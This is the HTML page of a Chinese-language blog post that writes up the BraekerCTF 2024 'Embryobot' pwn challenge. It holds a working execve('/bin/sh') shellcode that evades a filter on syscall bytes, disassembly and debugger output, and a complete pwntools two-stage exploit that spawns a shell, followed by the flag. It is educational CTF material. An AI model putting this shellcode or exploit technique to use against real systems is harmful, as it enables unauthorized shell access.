@@ -1,0 +1,787 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chtholly1.jpg">
+  <link rel="icon" href="/img/chtholly1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4c81b9">
+  <meta name="author" content="Isolator">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="BraekerCTF 2024 Embryobot">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode题目">
+<meta property="og:url" content="https://isolator-1.github.io/2024/04/10/ctf-pwn/BraekerCTF%202024/index.html">
+<meta property="og:site_name" content="Isolator&#39;s Blog">
+<meta property="og:description" content="BraekerCTF 2024 Embryobot">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-04-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-04-10T03:47:20.320Z">
+<meta property="article:author" content="Isolator">
+<meta property="article:tag" content="ctf-pwn">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>shellcode题目 - Isolator&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"isolator-1.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>_φ_(．．) Chtholly Nota Seniorious</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/chtholly2.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="shellcode题目"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-04-10 00:00" pubdate>
+          April 10, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          31 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">shellcode题目</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="shellcode的一些trick"><a href="#shellcode的一些trick" class="headerlink" title="shellcode的一些trick"></a>shellcode的一些trick</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">//检查不许出现syscall的字节： <br><span class="hljs-keyword">if</span> ( *v11 == <span class="hljs-number">0x80CD</span> || *v11 == <span class="hljs-number">0x340F</span> || *v11 == <span class="hljs-number">0x50F</span> )<br>    &#123;<br>      printf(<span class="hljs-string">&quot;Failed filter at byte %d!\n&quot;</span>, l);<br>      exit(<span class="hljs-number">1</span>);<br>    &#125;<br><br>把push <span class="hljs-number">0x50f</span>改成 push <span class="hljs-number">0x50e</span> ; inc qword ptr [rsp] <br>shellcode =  \<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;,&#x27;-p&#x27;], envp=0) */</span><br><span class="hljs-string">    /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="hljs-string">    push 0x68</span><br><span class="hljs-string">    mov rax, 0x732f2f2f6e69622f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    /* push argument array [&#x27;sh\x00&#x27;, &#x27;-p\x00&#x27;] */</span><br><span class="hljs-string">    /* push b&#x27;sh\x00-p\x00&#x27; */</span><br><span class="hljs-string">    mov rax, 0x101010101010101</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x101010101010101 ^ 0x702d006873</span><br><span class="hljs-string">    xor [rsp], rax</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    push rsi /* null terminate */</span><br><span class="hljs-string">    push 0xb</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    add rsi, rsp</span><br><span class="hljs-string">    push rsi /* &#x27;-p\x00&#x27; */</span><br><span class="hljs-string">    push 0x10</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    add rsi, rsp</span><br><span class="hljs-string">    push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    /* call execve() */</span><br><span class="hljs-string">    push 0x3b /* 0x3b */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    //syscall</span><br><span class="hljs-string">    push 0x050e</span><br><span class="hljs-string">    inc qword ptr [rsp]</span><br><span class="hljs-string">    jmp rsp</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h4><p>BraekerCTF 2024 Embryobot</p>
+<p>参考 <a target="_blank" rel="noopener" href="https://ctftime.org/writeup/38694">https://ctftime.org/writeup/38694</a></p>
+<p>只给了一个base64，没给文件，解密出来就是elf</p>
+<p>f0VMRgEBAbADWTDJshLNgAIAAwABAAAAI4AECCwAAAAAAADo3////zQAIAABAAAAAAAAAACABAgAgAQITAAAAEwAAAAHAAAAABAAAA==</p>
+<h4 id="WriteUP"><a href="#WriteUP" class="headerlink" title="WriteUP"></a>WriteUP</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop]<br>└─$ <span class="hljs-built_in">cat</span> <span class="hljs-built_in">test</span>  <br>ELF�Y0ɲ<span class="hljs-comment">#,�����4 LL                                                                             </span><br>┌──(kali㉿kali)-[~/Desktop]<br>└─$ file <span class="hljs-built_in">test</span>    <br><span class="hljs-built_in">test</span>: ELF 32-bit LSB executable, Intel 80386, version 1, statically linked, no section header<br></code></pre></td></tr></table></figure>
+
+<p>发现这是一个elf文件，并且可以执行</p>
+<p>在ida里查看start处调用了一个函数，到08048007</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">LOAD:08048007                               loc_8048007:                  <br>LOAD:08048007 B0 03                         mov     al, 3<br>LOAD:08048009 59                            pop     ecx<br>LOAD:0804800A 30 C9                         xor     cl, cl<br>LOAD:0804800C B2 12                         mov     dl, 12h<br>LOAD:0804800E CD 80                         int     80h<br>LOAD:0804800E<br>LOAD:08048010 02 00                         add     al, [eax]<br>LOAD:08048012 03 00                         add     eax, [eax]<br>LOAD:08048014 01 00                         add     [eax], eax<br>LOAD:08048014<br>LOAD:08048014                               ; ------------------------------<br>LOAD:08048016 00 00                         dw 0<br>LOAD:08048018 23 80 04 08                   dd offset start<br>LOAD:0804801C 2C 00 00 00                   dd 2Ch<br>LOAD:08048020 00 00 00                      db 3 dup(0)<br>LOAD:08048023                               ; -------------------------------<br>LOAD:08048023<br>LOAD:08048023                               public start<br>LOAD:08048023                               start:                        <br>LOAD:08048023 E8 DF FF FF FF                call    loc_8048007<br></code></pre></td></tr></table></figure>
+
+<p>这个函数调用了一个0x80，但是这里看不懂是干什么，动态调试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">─────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; x/10i 0x8048000<br>   0x8048000:   jg     0x8048047<br>   0x8048002:   dec    esp<br>   0x8048003:   inc    esi<br>   0x8048004:   add    DWORD PTR [ecx],eax<br>   0x8048006:   add    DWORD PTR [eax-0x36cfa6fd],esi<br>   0x804800c:   mov    dl,0x12<br>   0x804800e:   int    0x80<br>=&gt; 0x8048010:   add    al,BYTE PTR [eax]<br>   0x8048012:   add    eax,DWORD PTR [eax]<br>   0x8048014:   add    DWORD PTR [eax],eax<br></code></pre></td></tr></table></figure>
+
+<p>结合程序实际运行的状况，这个程序里唯一的一个int 0x80应该是一个输入</p>
+<p>输入的地址猜测应该是在ecx上（是第三个参数，第一个是调用号eax，第二个是文件描述符ebx）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pwndbg&gt; reg ecx<br> ECX  0x8048000 ◂— jg 0x8048047 /* 0x464c457f */<br></code></pre></td></tr></table></figure>
+
+<p>而这个0x8048000就是程序的起始地址（ida里可以看到），也就是说，这个程序从通过sys_read读了一个字符串放到了程序开头</p>
+<p>我们需要做的就是修改一下这个程序的指令，再跳转回来执行我们写入的指令，当我们第二次执行到输入的时候，通过shellcode获取bash</p>
+<p>当执行完int0x80之后，下一条指令在偏移量为0x10的位置上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">LOAD:0804800E CD 80                         int     80h<br>LOAD:0804800E<br>LOAD:08048010 02 00                         add     al, [eax]<br></code></pre></td></tr></table></figure>
+
+<p>下一条指令原本时add al, [eax]，我们想重新执行一下前面的代码，因此把他覆盖成一个jmp指令</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">jmp</span> <span class="hljs-built_in">ecx</span><br></code></pre></td></tr></table></figure>
+
+<p>ecx是0x08048000没变，相当于读取输入之后，由回到开头，马上又要重新执行一遍0x08048000~0x08048010这部分代码</p>
+<p>这部分代码原本是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">LOAD:08048007 B0 03                         mov     al, 3<br>LOAD:08048009 59                            pop     ecx<br>LOAD:0804800A 30 C9                         xor     cl, cl<br>LOAD:0804800C B2 12                         mov     dl, 12h<br>LOAD:0804800E CD 80                         int     80h<br></code></pre></td></tr></table></figure>
+
+<p>第一条指令不变，把第二个改成add ecx, 0x10，这样的目的是指向一段无关紧要的地址，用来作为输入shellcode的空间</p>
+<p>在sys_read时第四个参数（edx）是读取的buffer的空间，之前的0x12可能不够用，改大一点（这里不一定非要0x80）</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x3</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-number">0x10</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>, <span class="hljs-number">0x80</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span><br></code></pre></td></tr></table></figure>
+
+<p>这样第二次输入一个shellcode，就会被放到int 0x80之后继续执行，然后就可以获得shell了</p>
+<p>由于0x08048000~0x08048010是16个字节，需要补齐</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">nop<br>nop<br>nop<br>nop<br>nop<br>nop<br>nop<br>mov al, 0x3<br>add ecx, 0x10<br>mov dl, 0x80<br>int 0x80<br>jmp ecx<br></code></pre></td></tr></table></figure>
+
+<p>这里nop指令的位置不重要，放前边放后边穿插着来都无所谓，保证jmp的位置就可以</p>
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&quot;124.16.75.162&quot;,31058 )</span><br>p = process(<span class="hljs-string">&quot;./test&quot;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>stage1 = asm(<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    mov al, 0x3</span><br><span class="hljs-string">    add ecx, 0x10</span><br><span class="hljs-string">    mov dl, 0x80</span><br><span class="hljs-string">    int 0x80</span><br><span class="hljs-string">    jmp ecx</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br>p.send(stage1)<br>p.send(asm(shellcraft.sh()))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<p>flag是</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">159</span>d60ad-<span class="hljs-number">1703</span>-<span class="hljs-number">430</span>c-bf9f-ea54e68b9dbf&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf-pwn/" class="category-chain-item">ctf-pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf-pwn/">#ctf-pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>shellcode题目</div>
+      <div>https://isolator-1.github.io/2024/04/10/ctf-pwn/BraekerCTF 2024/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Isolator</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>April 10, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/04/11/ai/LLM/" title="LLM学习笔记">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">LLM学习笔记</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/01/crypto/Searchable%20Encryption/" title="Searchable Encryption">
+                        <span class="hidden-mobile">Searchable Encryption</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
